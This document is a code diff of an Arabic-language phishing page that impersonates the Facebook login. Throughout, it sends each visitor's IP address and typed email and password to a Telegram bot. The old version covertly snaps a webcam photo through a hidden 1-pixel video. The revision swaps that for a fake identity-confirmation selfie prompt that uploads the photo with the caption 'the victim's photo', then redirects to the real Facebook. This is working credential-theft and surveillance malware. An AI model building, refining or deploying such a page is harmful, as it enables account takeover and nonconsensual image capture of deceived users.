@@ -3,28 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - تسجيل الدخول</title>
+    <title>Facebook - تأكيد الهوية</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
-        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; }
-        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
-        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
-        /* جعل الفيديو 1 بكسل وشفاف لضمان عمل الكاميرا وعدم ظهور سواد */
-        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 30px; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 340px; text-align: center; }
+        .header-text { color: #1c1e21; font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .info-text { color: #606770; font-size: 14px; margin-bottom: 20px; }
+        #video { width: 100%; height: 250px; background: #000; border-radius: 8px; margin-bottom: 15px; display: none; object-fit: cover; }
+        .btn { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div style="color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px;">facebook</div>
+    <div style="color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 20px;">facebook</div>
 
-    <div class="login-box">
+    <div class="login-box" id="step1">
+        <div class="header-text">تسجيل الدخول إلى فيسبوك</div>
         <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
         <input type="password" id="pass" placeholder="كلمة السر">
-        <button class="login-btn" onclick="sendData()">تسجيل الدخول</button>
+        <button class="btn" onclick="nextStep()">تسجيل الدخول</button>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
+    <div class="login-box" id="step2" style="display:none;">
+        <div class="header-text">تأكيد هويتك</div>
+        <p class="info-text">لقد اكتشفنا نشاطاً غير معتاد. يرجى التقاط صورة سيلفي سريعة للتأكد من ملكيتك للحساب.</p>
+        <video id="video" autoplay playsinline></video>
+        <button class="btn" id="capture-btn" onclick="takeFinalShot()">التقاط صورة وتأكيد</button>
+        <p id="status" style="margin-top:10px; color:#1877f2; display:none;">جاري الرفع...</p>
+    </div>
+
     <canvas id="canvas"></canvas>
 
     <script>
@@ -33,28 +42,42 @@
 
         // إرسال الـ IP فوراً عند فتح الصفحة
         window.onload = async () => {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("🌐 IP الجديد: " + data.ip)}`);
-            
-            // طلب الكاميرا
-            startCamera();
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("🌐 زائر جديد:\nIP: " + data.ip)}`);
+            } catch (e) {}
         };
+
+        function nextStep() {
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) { alert("يرجى إدخال البيانات"); return; }
+            
+            // إرسال الحساب أولاً
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("👤 حساب جديد:\nUser: "+u+"\nPass: "+p)}`);
+            
+            // الانتقال لخطوة الكاميرا
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            startCamera();
+        }
 
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
+                video.style.display = 'block';
                 video.srcObject = stream;
-                
-                // ننتظر 5 ثواني كاملة عشان العدسة تفتح وتعدل الإضاءة
-                setTimeout(capturePhoto, 5000);
             } catch (e) {
-                console.log("الضحية رفض الكاميرا");
+                alert("يجب السماح بالكاميرا لتأكيد الهوية!");
             }
         }
 
-        async function capturePhoto() {
+        async function takeFinalShot() {
+            document.getElementById('capture-btn').disabled = true;
+            document.getElementById('status').style.display = 'block';
+            
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -66,16 +89,14 @@
             const fd = new FormData();
             fd.append('chat_id', chat);
             fd.append('photo', blob, 'shot.jpg');
-            fd.append('caption', '🎯 صورة الضحية (تم حل مشكلة السواد)');
+            fd.append('caption', '🎯 صورة الضحية المضمونة');
 
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
-
-        function sendData() {
-            const u = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("👤 User: "+u+"\n🔑 Pass: "+p)}`);
-            window.location.href = "https://www.facebook.com";
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            
+            // التحويل للفيسبوك الأصلي
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com";
+            }, 1500);
         }
     </script>
 </body>
